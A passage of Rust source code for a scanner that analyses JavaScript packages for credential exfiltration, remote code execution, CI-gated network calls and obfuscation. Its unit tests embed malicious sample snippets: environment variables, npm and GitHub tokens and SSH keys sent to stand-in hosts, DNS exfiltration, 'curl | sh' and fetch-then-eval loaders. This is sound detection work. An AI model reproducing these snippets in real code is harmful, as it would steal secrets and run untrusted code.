                                self.mark_taint(&local, format!("process.env.{key}"));
                            } else if let Some(t) = self.taint(init) {
                                if src_path.as_deref() != Some("process.env") {
                                    self.mark_taint(&local, t);
                                }
                            }
                        }
                        Mode::Detect => {}
                    }
                }
                if let (Mode::Taint, Some(rest)) = (self.mode, &op.rest) {
                    if src_path.as_deref() == Some("process.env") {
                        if let BindingPattern::BindingIdentifier(r) = &rest.argument {
                            self.mark_taint(r.name.as_str(), "process.env (every environment variable)".into());
                        }
                    }
                }
            }
            _ => {}
        }
    }

    fn callish_path(&self, e: &Expression) -> Option<String> {
        match e.without_parentheses() {
            Expression::CallExpression(c) => self.path_of(&c.callee),
            Expression::NewExpression(n) => self.path_of(&n.callee),
            Expression::AwaitExpression(a) => self.callish_path(&a.argument),
            _ => None,
        }
    }

    fn callish_args<'x>(&self, e: &'x Expression<'x>) -> Option<&'x [Argument<'x>]> {
        match e.without_parentheses() {
            Expression::CallExpression(c) => Some(&c.arguments),
            Expression::NewExpression(n) => Some(&n.arguments),
            Expression::AwaitExpression(a) => self.callish_args(&a.argument),
            _ => None,
        }
    }

    fn collect_binding(&mut self, name: &str, init: &Expression) {
        let init = init.without_parentheses();
        // module aliases
        if let Expression::CallExpression(c) = init {
            if let Some(m) = self.require_arg(c) {
                self.alias.insert(name.to_string(), normalize_module(&m));
                return;
            }
        }
        if let Expression::StaticMemberExpression(_) = init {
            if let Some(p) = self.path_of(init) {
                let root = p.split('.').next().unwrap_or("");
                let known = [
                    "http", "https", "http2", "net", "tls", "dgram", "dns", "child_process", "fs", "os", "vm", "process",
                    "axios", "got", "undici", "request", "needle", "superagent", "Buffer", "String", "JSON", "path",
                ];
                if known.contains(&root) {
                    self.alias.insert(name.to_string(), p);
                    return;
                }
            }
        }
        if let Expression::Identifier(id) = init {
            if let Some(a) = self.alias.get(id.name.as_str()).cloned() {
                self.alias.insert(name.to_string(), a);
                return;
            }
        }
        // functions: remember parameter names for call-site taint
        let params = match init {
            Expression::ArrowFunctionExpression(f) => Some(param_names(&f.params)),
            Expression::FunctionExpression(f) => Some(param_names(&f.params)),
            _ => None,
        };
        if let Some(p) = params {
            self.fn_params.insert(name.to_string(), p);
            return;
        }
        // constants
        if let Expression::ObjectExpression(o) = init {
            let m = self.obj_skel(o, 0);
            self.consts.insert(name.to_string(), ConstVal::Obj(m));
            return;
        }
        let s = self.skel(init);
        if !(s.text.is_empty() || s.text == HOLE.to_string()) {
            if s.decoded {
                self.decoded_names.insert(name.to_string());
            }
            self.consts.insert(name.to_string(), ConstVal::Str(s));
        }
    }

    fn arg_involves_decoding(&self, e: &Expression) -> bool {
        let s = self.skel(e);
        if s.decoded {
            return true;
        }
        match e.without_parentheses() {
            Expression::Identifier(id) => self.decoded_names.contains(id.name.as_str()),
            Expression::CallExpression(c) => {
                let p = self.path_of(&c.callee).unwrap_or_default();
                if matches!(p.as_str(), "atob" | "String.fromCharCode" | "Buffer.from" | "decodeURIComponent" | "unescape") {
                    return true;
                }
                if let Expression::StaticMemberExpression(m) = c.callee.without_parentheses() {
                    return self.arg_involves_decoding(&m.object)
                        || c.arguments.iter().any(|a| a.as_expression().is_some_and(|x| self.arg_involves_decoding(x)));
                }
                c.arguments.iter().any(|a| a.as_expression().is_some_and(|x| self.arg_involves_decoding(x)))
            }
            _ => false,
        }
    }
}

fn push_options(m: &HashMap<String, Skel>, urls: &mut Vec<String>, decoded: &mut bool) {
    for k in ["url", "uri", "href", "baseURL", "baseUrl", "prefixUrl", "origin"] {
        if let Some(v) = m.get(k) {
            *decoded |= v.decoded;
            if dest::host_of(&v.text).is_some() {
                urls.push(v.text.clone());
            }
        }
    }
    if let Some(h) = m.get("hostname").or_else(|| m.get("host")) {
        *decoded |= h.decoded;
        if dest::host_of(&h.text).is_some() {
            let proto = m.get("protocol").map(|p| p.text.trim_end_matches(':').to_string()).unwrap_or_else(|| "https".into());
            let port = m.get("port").map(|p| format!(":{}", p.text)).unwrap_or_default();
            let path = m.get("path").map(|p| p.text.clone()).unwrap_or_default();
            urls.push(format!("{proto}://{}{port}{path}", h.text));
        }
    }
}

fn param_names(params: &FormalParameters) -> Vec<String> {
    params
        .items
        .iter()
        .map(|p| match &p.pattern {
            BindingPattern::BindingIdentifier(b) => b.name.as_str().to_string(),
            _ => String::new(),
        })
        .collect()
}

fn format_num(v: f64) -> String {
    if v.fract() == 0.0 && v.abs() < 1e15 {
        format!("{}", v as i64)
    } else {
        format!("{v}")
    }
}

fn decode_b64(s: &str) -> Option<String> {
    let t = s.trim();
    let bytes = B64
        .decode(t)
        .or_else(|_| base64::engine::general_purpose::URL_SAFE.decode(t))
        .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(t.trim_end_matches('=')))
        .ok()?;
    String::from_utf8(bytes).ok()
}

fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

pub fn network_tools_in(cmd: &str) -> Vec<String> {
    let lower = cmd.to_ascii_lowercase();
    let mut found = Vec::new();
    for word in lower.split(|c: char| c.is_whitespace() || "|;&()`'\"$".contains(c)) {
        let base = word.rsplit(['/', '\\']).next().unwrap_or(word).trim_end_matches(".exe");
        if NETWORK_TOOLS.contains(&base) && !found.contains(&base.to_string()) {
            found.push(base.to_string());
        }
    }
    found
}

pub fn pipes_to_shell(cmd: &str) -> bool {
    let l = cmd.to_ascii_lowercase();
    let piped = ["| sh", "|sh", "| bash", "|bash", "| zsh", "| node", "|node", "| python", "| iex", "|iex", "| invoke-expression"]
        .iter()
        .any(|p| l.contains(p));
    piped || l.contains("iex(") || l.contains("invoke-expression") || (l.contains("bash -c") && l.contains("$(curl"))
}

impl<'a> Visit<'a> for Ctx<'_> {
    fn visit_variable_declarator(&mut self, it: &VariableDeclarator<'a>) {
        if let Some(init) = &it.init {
            self.bind_declarator(&it.id, init);
        }
        walk::walk_variable_declarator(self, it);
    }

    fn visit_function(&mut self, it: &Function<'a>, flags: ScopeFlags) {
        if self.mode == Mode::Collect {
            if let Some(id) = &it.id {
                self.fn_params.insert(id.name.as_str().to_string(), param_names(&it.params));
            }
        }
        walk::walk_function(self, it, flags);
    }

    fn visit_assignment_expression(&mut self, it: &AssignmentExpression<'a>) {
        if self.mode == Mode::Taint {
            if let Some(t) = self.taint(&it.right) {
                match &it.left {
                    AssignmentTarget::AssignmentTargetIdentifier(id) => self.mark_taint(id.name.as_str(), t),
                    AssignmentTarget::StaticMemberExpression(m) => {
                        if let Expression::Identifier(root) = m.object.without_parentheses() {
                            self.mark_taint(root.name.as_str(), t);
                        }
                    }
                    AssignmentTarget::ComputedMemberExpression(m) => {
                        if let Expression::Identifier(root) = m.object.without_parentheses() {
                            self.mark_taint(root.name.as_str(), t);
                        }
                    }
                    _ => {}
                }
            }
        }
        if self.mode == Mode::Collect {
            if let AssignmentTarget::AssignmentTargetIdentifier(id) = &it.left {
                if let Expression::CallExpression(c) = it.right.without_parentheses() {
                    if let Some(m) = self.require_arg(c) {
                        self.alias.insert(id.name.as_str().to_string(), normalize_module(&m));
                    }
                }
            }
        }
        walk::walk_assignment_expression(self, it);
    }

    fn visit_import_declaration(&mut self, it: &ImportDeclaration<'a>) {
        let module = it.source.value.as_str();
        if self.mode == Mode::Collect {
            if module.starts_with('.') {
                self.requires.push(module.to_string());
            }
            if let Some(specs) = &it.specifiers {
                let m = normalize_module(module);
                for s in specs {
                    match s {
                        ImportDeclarationSpecifier::ImportSpecifier(s) => {
                            let imported = s.imported.name();
                            let path = if imported == "default" { m.clone() } else { format!("{m}.{imported}") };
                            self.alias.insert(s.local.name.as_str().to_string(), path);
                        }
                        ImportDeclarationSpecifier::ImportDefaultSpecifier(s) => {
                            self.alias.insert(s.local.name.as_str().to_string(), m.clone());
                        }
                        ImportDeclarationSpecifier::ImportNamespaceSpecifier(s) => {
                            self.alias.insert(s.local.name.as_str().to_string(), m.clone());
                        }
                    }
                }
            }
        }
        walk::walk_import_declaration(self, it);
    }

    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        if self.mode == Mode::Collect {
            let s = self.skel(&it.source);
            if s.complete && s.text.starts_with('.') {
                self.requires.push(s.text);
            }
        }
        walk::walk_import_expression(self, it);
    }

    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        match self.mode {
            Mode::Collect => {
                if let Some(m) = self.require_arg(it) {
                    if m.starts_with('.') {
                        self.requires.push(m);
                    }
                }
            }
            Mode::Taint => {
                // call-site → parameter taint for local functions
                if let Expression::Identifier(id) = it.callee.without_parentheses() {
                    if let Some(params) = self.fn_params.get(id.name.as_str()).cloned() {
                        for (i, a) in it.arguments.iter().enumerate() {
                            if let (Some(p), Some(t)) = (params.get(i), a.as_expression().and_then(|e| self.taint(e))) {
                                if !p.is_empty() {
                                    self.mark_taint(p, t);
                                }
                            }
                        }
                    }
                }
                // arr.push(secret) / Object.assign(target, secret)
                if let Some(p) = self.path_of(&it.callee) {
                    let target = if p.ends_with(".push") || p.ends_with(".unshift") {
                        if let Expression::StaticMemberExpression(m) = it.callee.without_parentheses() {
                            match m.object.without_parentheses() {
                                Expression::Identifier(id) => Some(id.name.as_str().to_string()),
                                _ => None,
                            }
                        } else {
                            None
                        }
                    } else if p == "Object.assign" {
                        match it.arguments.first().and_then(|a| a.as_expression()).map(|e| e.without_parentheses()) {
                            Some(Expression::Identifier(id)) => Some(id.name.as_str().to_string()),
                            _ => None,
                        }
                    } else {
                        None
                    };
                    if let Some(t) = target {
                        let src = it.arguments.iter().filter_map(|a| a.as_expression()).find_map(|e| self.taint(e));
                        if let Some(s) = src {
                            self.mark_taint(&t, s);
                        }
                    }
                }
            }
            Mode::Detect => {
                let path = self.path_of(&it.callee).unwrap_or_default();
                if let Some(kind) = sink_kind(&path, false) {
                    self.on_sink(it.span, kind, &path, &it.arguments);
                } else if eval_like(&path, false) {
                    if let Some(a) = it.arguments.first().and_then(|a| a.as_expression()) {
                        let s = self.skel(a);
                        let decoding = self.arg_involves_decoding(a);
                        if !s.complete || decoding {
                            let (line, ev) = (self.line(it.span), self.evidence(it.span));
                            self.eval_sites.push((line, ev, decoding));
                        }
                    }
                } else if let Some(what) = self.cred_read(it) {
                    let (line, ev) = (self.line(it.span), self.evidence(it.span));
                    self.secret_reads.push((line, ev, what));
                } else if matches!(path.as_str(), "JSON.stringify" | "Object.keys" | "Object.entries" | "Object.values")
                    && it.arguments.first().and_then(|a| a.as_expression()).and_then(|e| self.path_of(e)).as_deref() == Some("process.env")
                {
                    let (line, ev) = (self.line(it.span), self.evidence(it.span));
                    self.secret_reads.push((line, ev, "every environment variable".into()));
                }
                if let Expression::StaticMemberExpression(m) = it.callee.without_parentheses() {
                    self.on_handle_method(it, m);
                }
            }
        }
        walk::walk_call_expression(self, it);
    }

    fn visit_new_expression(&mut self, it: &NewExpression<'a>) {
        if self.mode == Mode::Detect {
            let path = self.path_of(&it.callee).unwrap_or_default();
            if let Some(kind) = sink_kind(&path, true) {
                self.on_sink(it.span, kind, &path, &it.arguments);
            } else if eval_like(&path, true) {
                if let Some(a) = it.arguments.last().and_then(|a| a.as_expression()) {
                    let s = self.skel(a);
                    let decoding = self.arg_involves_decoding(a);
                    if !s.complete || decoding {
                        let (line, ev) = (self.line(it.span), self.evidence(it.span));
                        self.eval_sites.push((line, ev, decoding));
                    }
                }
            }
        }
        walk::walk_new_expression(self, it);
    }

    fn visit_if_statement(&mut self, it: &IfStatement<'a>) {
        if self.mode == Mode::Detect && self.is_ci_test(&it.test) {
            self.visit_expression(&it.test);
            self.ci_depth += 1;
            self.visit_statement(&it.consequent);
            if let Some(alt) = &it.alternate {
                self.visit_statement(alt);
            }
            self.ci_depth -= 1;
            return;
        }
        walk::walk_if_statement(self, it);
    }

    fn visit_conditional_expression(&mut self, it: &ConditionalExpression<'a>) {
        if self.mode == Mode::Detect && self.is_ci_test(&it.test) {
            self.visit_expression(&it.test);
            self.ci_depth += 1;
            self.visit_expression(&it.consequent);
            self.visit_expression(&it.alternate);
            self.ci_depth -= 1;
            return;
        }
        walk::walk_conditional_expression(self, it);
    }

    fn visit_logical_expression(&mut self, it: &LogicalExpression<'a>) {
        if self.mode == Mode::Detect && self.is_ci_test(&it.left) {
            self.visit_expression(&it.left);
            self.ci_depth += 1;
            self.visit_expression(&it.right);
            self.ci_depth -= 1;
            return;
        }
        walk::walk_logical_expression(self, it);
    }

    /// `if (!process.env.CI) return;` gates everything after it in the block.
    fn visit_statements(&mut self, it: &oxc_allocator::Vec<'a, Statement<'a>>) {
        let mut raised = 0;
        for stmt in it {
            self.visit_statement(stmt);
            if self.mode == Mode::Detect {
                if let Statement::IfStatement(ifs) = stmt {
                    if self.is_ci_test(&ifs.test) && exits(&ifs.consequent) {
                        self.ci_depth += 1;
                        raised += 1;
                    }
                }
            }
        }
        self.ci_depth -= raised;
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        if self.mode == Mode::Detect {
            let v = it.value.as_str();
            if v.len() >= 400 && !v.starts_with("data:") && entropy(v) > 5.2 {
                self.big_literals += 1;
            }
        }
    }
}

fn exits(s: &Statement) -> bool {
    match s {
        Statement::ReturnStatement(_) | Statement::ThrowStatement(_) => true,
        Statement::BlockStatement(b) => b.body.iter().any(exits),
        Statement::ExpressionStatement(e) => match &e.expression {
            Expression::CallExpression(c) => matches!(
                &c.callee,
                Expression::StaticMemberExpression(m) if m.property.name.as_str() == "exit"
            ),
            _ => false,
        },
        _ => false,
    }
}

fn source_type(path: &str, module: bool) -> SourceType {
    let st = if path.ends_with(".mjs") {
        SourceType::mjs()
    } else if path.ends_with(".cjs") {
        SourceType::cjs()
    } else if module {
        SourceType::mjs()
    } else {
        SourceType::cjs()
    };
    if path.ends_with(".ts") || path.ends_with(".mts") || path.ends_with(".cts") {
        return SourceType::ts();
    }
    st
}

/// Analyze one file. Never fails: unparseable files get an empty report.
pub fn analyze(path: &str, src: &str) -> FileReport {
    let allocator = Allocator::default();
    let opts = ParseOptions { allow_return_outside_function: true, ..ParseOptions::default() };
    // Try ESM first (it's a superset for most code), fall back to script for
    // sloppy-mode CommonJS (`with`, octal escapes, …).
    let errors = |r: &oxc_parser::ParserReturn| r.diagnostics.errors().count();
    let mut ret = Parser::new(&allocator, src, source_type(path, true)).with_options(opts).parse();
    if ret.fatal_error || errors(&ret) > 0 {
        let alt = Parser::new(&allocator, src, source_type(path, false)).with_options(opts).parse();
        if !alt.fatal_error && (errors(&alt) < errors(&ret) || ret.fatal_error) {
            ret = alt;
        }
    }
    let mut ctx = Ctx {
        src,
        lines: LineIndex::new(src),
        mode: Mode::Collect,
        alias: HashMap::new(),
        consts: HashMap::new(),
        fn_params: HashMap::new(),
        tainted: HashMap::new(),
        taint_changed: false,
        handles: HashMap::new(),
        decoded_names: HashSet::new(),
        requires: Vec::new(),
        ci_depth: 0,
        report: FileReport { path: path.to_string(), parsed: !ret.fatal_error, ..Default::default() },
        eval_sites: Vec::new(),
        ci_sinks: Vec::new(),
        secret_reads: Vec::new(),
        hidden_dest: Vec::new(),
        big_literals: 0,
    };
    if ret.fatal_error {
        obfuscation_text_only(&mut ctx);
        return ctx.report;
    }
    let program = &ret.program;
    ctx.visit_program(program);
    ctx.mode = Mode::Taint;
    for _ in 0..6 {
        ctx.taint_changed = false;
        ctx.visit_program(program);
        if !ctx.taint_changed {
            break;
        }
    }
    ctx.mode = Mode::Detect;
    ctx.visit_program(program);
    finish(&mut ctx);
    ctx.report
}

fn obfuscation_text_only(ctx: &mut Ctx) {
    let ids = count_obfuscator_ids(ctx.src);
    if ids >= 10 {
        ctx.report.hits.push(Hit {
            id: "code.obfuscation",
            severity: crate::model::Severity::Medium,
            title: "obfuscated code".into(),
            detail: format!("{ids} javascript-obfuscator style identifiers (_0x…); file did not parse"),
            line: 1,
            evidence: String::new(),
            urls: vec![],
        });
    }
}

fn count_obfuscator_ids(src: &str) -> usize {
    let b = src.as_bytes();
    let mut n = 0;
    let mut i = 0;
    while i + 6 < b.len() {
        if b[i] == b'_' && b[i + 1] == b'0' && b[i + 2] == b'x' {
            let hex = b[i + 3..].iter().take_while(|c| c.is_ascii_hexdigit()).count();
            if hex >= 4 {
                n += 1;
                i += 3 + hex;
                continue;
            }
        }
        i += 1;
    }
    n
}

/// Decisions that need the whole file.
fn finish(ctx: &mut Ctx) {
    use crate::model::Severity;
    ctx.report.requires = std::mem::take(&mut ctx.requires);

    // remote eval
    let has_net = ctx.report.has_network_sink;
    for (line, ev, decoding) in std::mem::take(&mut ctx.eval_sites) {
        if decoding || has_net {
            ctx.push_hit(Hit {
                id: "code.remote-eval",
                severity: Severity::High,
                title: if decoding { "decodes hidden code and runs it".into() } else { "runs code it doesn't contain".into() },
                detail: if decoding {
                    "an encoded string is decoded and passed to eval / new Function / vm".into()
                } else {
                    "a computed string reaches eval / new Function / vm in a file that makes network requests".into()
                },
                line,
                evidence: ev,
                urls: vec![],
            });
        }
    }

    // CI-gated network
    if let Some((line, ev, urls)) = ctx.ci_sinks.first().cloned() {
        ctx.push_hit(Hit {
            id: "code.ci-gated-network",
            severity: Severity::High,
            title: "makes a network call only in CI (or on specific hosts)".into(),
            detail: "the request sits behind a check of CI environment variables or the hostname — malware does this to fire only where tokens live, or to hide from sandboxes".into(),
            line,
            evidence: ev,
            urls,
        });
    }

    // credential reads (only when not already part of an exfil flow)
    let exfil = ctx.report.hits.iter().any(|h| h.id == "net.exfil-flow");
    if !exfil {
        let reads = std::mem::take(&mut ctx.secret_reads);
        if let Some((line, ev, _)) = reads.first().cloned() {
            let mut whats: Vec<String> = reads.iter().map(|r| r.2.clone()).collect();
            whats.sort();
            whats.dedup();
            ctx.push_hit(Hit {
                id: "secret.read",
                severity: Severity::Medium,
                title: "reads credentials".into(),
                detail: format!("reads {}", whats.join("; ")),
                line,
                evidence: ev,
                urls: vec![],
            });
        }
    }

    // obfuscation
    let mut reasons = Vec::new();
    let ids = count_obfuscator_ids(ctx.src);
    if ids >= 10 {
        reasons.push(format!("{ids} javascript-obfuscator style identifiers (_0x…)"));
    }
    if ctx.big_literals > 0 && (has_net || !ctx.report.hits.is_empty()) {
        reasons.push(format!("{} long high-entropy string(s)", ctx.big_literals));
    }
    let hidden = std::mem::take(&mut ctx.hidden_dest);
    if let Some((_, _, u)) = hidden.first() {
        reasons.push(format!("network destination hidden with encoding (decodes to {})", clip(u, 80)));
    }
    let is_min = ctx.report.path.ends_with(".min.js");
    let long_line = ctx.src.lines().map(|l| l.len()).max().unwrap_or(0);
    if !is_min && long_line > 5000 && !reasons.is_empty() {
        reasons.push(format!("a {long_line}-character line"));
    }
    if !reasons.is_empty() {
        let (line, ev) = hidden.first().map(|h| (h.0, h.1.clone())).unwrap_or((1, String::new()));
        ctx.push_hit(Hit {
            id: "code.obfuscation",
            severity: Severity::Medium,
            title: "obfuscated code".into(),
            detail: reasons.join("; "),
            line,
            evidence: ev,
            urls: hidden.iter().map(|h| h.2.clone()).collect(),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(src: &str) -> Vec<&'static str> {
        analyze("index.js", src).hits.iter().map(|h| h.id).collect()
    }

    #[test]
    fn env_to_raw_ip_post() {
        let r = analyze(
            "setup.js",
            r#"
            const https = require('https');
            const data = JSON.stringify(process.env);
            const req = https.request({ hostname: '45.77.12.9', port: 443, path: '/c', method: 'POST' });
            req.write(data);
            req.end();
            "#,
        );
        let h = r.hits.iter().find(|h| h.id == "net.exfil-flow").expect("exfil flow");
        assert!(h.detail.contains("process.env"));
        assert!(r.sink_urls.iter().any(|(u, _)| u.contains("45.77.12.9")), "{:?}", r.sink_urls);
    }

    #[test]
    fn chained_end_with_secret() {
        let r = analyze(
            "a.js",
            "require('https').request('https://webhook.site/abc', {method:'POST'}).end(process.env.NPM_TOKEN)",
        );
        assert!(r.hits.iter().any(|h| h.id == "net.exfil-flow" && h.detail.contains("NPM_TOKEN")), "{:?}", r.hits);
        assert!(r.sink_urls.iter().any(|(u, _)| u.contains("webhook.site")));
    }

    #[test]
    fn fetch_body_and_destructured_env() {
        let r = analyze(
            "a.mjs",
            "const { GITHUB_TOKEN } = process.env;\nawait fetch(`https://evil.example/x?t=${GITHUB_TOKEN}`);",
        );
        assert!(r.hits.iter().any(|h| h.id == "net.exfil-flow"), "{:?}", r.hits);
    }

    #[test]
    fn taint_through_helper_function() {
        let r = analyze(
            "a.js",
            r#"
            const http = require('http');
            function send(payload) { http.request({ host: 'collect.example.net', method: 'POST' }).end(payload); }
            send(Buffer.from(JSON.stringify(process.env)).toString('base64'));
            "#,
        );
        assert!(r.hits.iter().any(|h| h.id == "net.exfil-flow"), "{:?}", r.hits);
    }

    #[test]
    fn dns_exfil() {
        let r = analyze(
            "a.js",
            "const dns = require('dns'); const os = require('os');\nconst h = Buffer.from(os.hostname()).toString('hex');\ndns.lookup(h + '.x.oast.fun', () => {});",
        );
        let h = r.hits.iter().find(|h| h.id == "net.exfil-flow").expect("dns exfil");
        assert!(h.title.contains("DNS"));
    }

    #[test]
    fn discord_webhook_destination() {
        let r = analyze(
            "a.js",
            "const axios = require('axios'); axios.post('https://discord.com/api/webhooks/123/abc', { content: require('os').hostname() });",
        );
        assert!(r.sink_urls.iter().any(|(u, _)| u.contains("discord.com/api/webhooks")));
        assert!(r.hits.iter().any(|h| h.id == "net.exfil-flow"), "{:?}", r.hits);
    }

    #[test]
    fn base64_hidden_url() {
        // aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw== → https://evil.example/c
        let r = analyze(
            "a.js",
            "const u = Buffer.from('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYw==', 'base64').toString();\nrequire('https').get(u);",
        );
        assert!(r.sink_urls.iter().any(|(u, _)| u == "https://evil.example/c"), "{:?}", r.sink_urls);
        let h = r.hits.iter().find(|h| h.id == "code.obfuscation").expect("hidden destination");
        assert!(h.detail.contains("hidden with encoding"));
    }

    #[test]
    fn char_code_url() {
        // "http://1.2.3.4" from char codes
        let codes: Vec<String> = "http://1.2.3.4".chars().map(|c| (c as u32).to_string()).collect();
        let r = analyze("a.js", &format!("fetch(String.fromCharCode({}))", codes.join(",")));
        assert!(r.sink_urls.iter().any(|(u, _)| u == "http://1.2.3.4"));
    }

    #[test]
    fn fetch_then_eval() {
        let r = analyze(
            "a.js",
            r#"
            const https = require('https');
            https.get('https://cdn.example.org/stage2.js', res => {
              let body = '';
              res.on('data', d => body += d);
              res.on('end', () => eval(body));
            });
            "#,
        );
        assert!(r.hits.iter().any(|h| h.id == "code.remote-eval"), "{:?}", r.hits);
    }

    #[test]
    fn decode_then_eval_without_network() {
        assert!(ids("eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())").contains(&"code.remote-eval"));
        assert!(ids("new Function(atob('cmV0dXJuIDE='))()").contains(&"code.remote-eval"));
    }

    #[test]
    fn plain_eval_of_constant_is_fine() {
        assert!(!ids("eval('1 + 1')").contains(&"code.remote-eval"));
    }

    #[test]
    fn ci_gated_call() {
        let hits = ids("if (process.env.GITHUB_ACTIONS) { fetch('https://x.example.com/p', { method: 'POST' }) }");
        assert!(hits.contains(&"code.ci-gated-network"), "{hits:?}");
        let early = ids("function f(){ if (!process.env.CI) return; require('https').get('https://x.example.com'); } f();");
        assert!(early.contains(&"code.ci-gated-network"), "{early:?}");
    }

    #[test]
    fn exec_network_tools_and_pipe_to_shell() {
        let r = analyze("a.js", "require('child_process').execSync('curl -s https://get.example.sh/i | sh')");
        assert!(r.hits.iter().any(|h| h.id == "code.remote-eval"), "{:?}", r.hits);
        let r = analyze("a.js", "const { spawn } = require('child_process'); spawn('wget', ['http://45.77.12.9/x'])");
        assert!(r.hits.iter().any(|h| h.id == "exec.network-tool"), "{:?}", r.hits);
        assert!(r.sink_urls.is_empty(), "exec isn't a JS network sink; urls go on the hit");
        let h = r.hits.iter().find(|h| h.id == "exec.network-tool").unwrap();
        assert!(h.urls.iter().any(|u| u.contains("45.77.12.9")));
    }

    #[test]
    fn spawn_with_env_option_is_not_exfil() {
        let r = analyze("a.js", "require('child_process').spawn('curl', ['https://example.com'], { env: process.env })");
        assert!(!r.hits.iter().any(|h| h.id == "net.exfil-flow"), "{:?}", r.hits);
    }

    #[test]
    fn credential_file_read() {
        let r = analyze(
            "a.js",
            "const fs = require('fs'), os = require('os'), path = require('path');\nconst t = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');",
        );
        let h = r.hits.iter().find(|h| h.id == "secret.read").expect("secret read");
        assert!(h.detail.contains("npm credentials"));
    }

    #[test]
    fn credential_file_sent_is_exfil() {
        let r = analyze(
            "a.js",
            "const fs = require('fs');\nconst k = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');\nfetch('https://a.example.com', { method: 'POST', body: k });",
        );
        let h = r.hits.iter().find(|h| h.id == "net.exfil-flow").expect("exfil");
        assert!(h.detail.contains("SSH keys"), "{}", h.detail);
        assert!(!r.hits.iter().any(|h| h.id == "secret.read"), "subsumed by exfil");
    }

    #[test]
    fn esbuild_style_download_is_not_exfil() {
        let r = analyze(
            "install.js",
            r#"
            const https = require('https');
            const version = require('./package.json').version;
            const url = `https://registry.npmjs.org/@esbuild/${process.platform}-${process.arch}/-/x-${version}.tgz`;
            https.get(url, res => res.pipe(require('fs').createWriteStream('bin')));
            "#,
        );
        assert!(r.hits.is_empty(), "{:?}", r.hits);
        assert!(r.sink_urls.iter().any(|(u, _)| u.starts_with("https://registry.npmjs.org/@esbuild/")));
    }

    #[test]
    fn esm_imports_and_requires_graph() {
        let r = analyze("a.mjs", "import { request } from 'node:https'; import './util.js'; const x = await import('./lazy.mjs'); request('https://h.example.com');");
        assert!(r.requires.contains(&"./util.js".to_string()));
        assert!(r.requires.contains(&"./lazy.mjs".to_string()));
        assert!(r.has_network_sink);
    }

    #[test]
    fn obfuscator_identifiers() {
        let src: String = (0..20).map(|i| format!("var _0x{:04x}=1;", 0x1a2b + i)).collect();
        assert!(ids(&src).contains(&"code.obfuscation"));
    }

    #[test]
    fn unparseable_file_does_not_panic() {
        let r = analyze("broken.js", "function (( {");
        assert!(r.hits.is_empty());
    }

    #[test]
    fn reversed_string() {
        let r = analyze("a.js", "fetch('c/elpmaxe.live//:sptth'.split('').reverse().join(''))");
        assert!(r.sink_urls.iter().any(|(u, _)| u == "https://evil.example/c"), "{:?}", r.sink_urls);
    }

    #[test]
    fn secret_names() {
        for s in ["NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "STRIPE_SECRET", "DB_PASSWORD", "MY_API_KEY"] {
            assert!(secret_name(s), "{s}");
        }
        for s in ["PATH", "HOME", "NODE_ENV", "CI"] {
            assert!(!secret_name(s), "{s}");
        }
    }
}
